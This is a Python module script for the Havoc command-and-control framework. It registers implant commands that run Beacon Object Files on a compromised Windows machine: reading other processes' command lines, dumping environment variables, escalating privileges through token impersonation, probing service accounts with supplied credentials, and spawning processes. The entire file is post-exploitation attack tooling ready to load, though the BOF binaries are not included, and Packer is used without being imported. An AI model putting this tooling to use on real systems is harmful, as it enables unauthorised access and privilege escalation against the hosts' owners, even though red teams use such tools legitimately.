from havoc import Demon, RegisterCommand, RegisterModule

def getcmdline( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer: Packer = Packer()

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Executing getcmdline" )

    args1 = params[0]
    packer.addstr(args1)

    demon.InlineExecute(TaskID, "go", "getcmdline.x64.o", packer.getbuffer(), False)
    return TaskID


def envdump( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer: Packer = Packer()

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Executing envdump" )


    demon.InlineExecute(TaskID, "go", "env.x64.o", b'', False)
    return TaskID


def elevate_pid( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer: Packer = Packer()

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Executing elevate_pid" )

    args1 = params[0]
    packer.addstr(args1)


    demon.InlineExecute(TaskID, "go", "elevate_pid.x64.o", packer.getbuffer(), False)
    return TaskID


def servicelookup( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer: Packer = Packer()

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Executing servicelookup" )

    if len(params) > 0 and params[0] is not None:
        host = params[0]
    else:
        host = ""

    packer.addstr(host)


    if len(params) > 1 and params[1] is not None:
        service = params[1]
    else:
        service = ""

    packer.addstr(service)


    if len(params) > 2 and params[2] is not None:
        domain = params[2]
    else:
        domain = ""

    packer.addstr(domain)


    if len(params) > 3 and params[3] is not None:
        username = params[3]
    else:
        username = ""

    packer.addstr(username)


    if len(params) > 4 and params[4] is not None:
        password = params[4]
    else:
        password = ""

    packer.addstr(password)



    demon.InlineExecute(TaskID, "go", "service_lookup.x64.o", packer.getbuffer(), False)
    return TaskID


def createproc( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer: Packer = Packer()

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Executing createproc" )

    args1 = params[0]
    packer.addstr(args1)

    demon.InlineExecute(TaskID, "go", "process.x64.o", packer.getbuffer(), False)
    return TaskID


RegisterModule( "bofcode", "", "", "", "", ""  )
RegisterCommand(getcmdline, "bofcode", "getcmdline", "BOF to extract the full command-line arguments used to launch a specific process by its name (e.g., notepad.exe), from another process’s memory.", 0, "[args]", "Notepad.exe" )
RegisterCommand(envdump, "bofcode", "envdump", "BOF to list environment variables available to the current process", 0, "[args]", "envdump" )
RegisterCommand(elevate_pid, "bofcode", "elevate_pid", "Privilege escalation via token impersonation in Windows BOF", 0, "[args]", "elevate_pid <Target PID of high priv>" )
RegisterCommand(servicelookup, "bofcode", "servicelookup", "BOF that checks whether a given Windows service account exists locally or remotely by resolving its Security Identifier (SID) using LookupAccountNameA. It can also optionally impersonate a user using LogonUserA before performing the lookup.", 0, "[args]", "host(. for local) servicename(WinDefend) domain(optional) username(optional) password(optional)" )
RegisterCommand(createproc, "bofcode", "createproc", "BOF that attempts to spawn a new process on the target system using CreateProcessA.", 0, "[args]", "<path to executable>" )
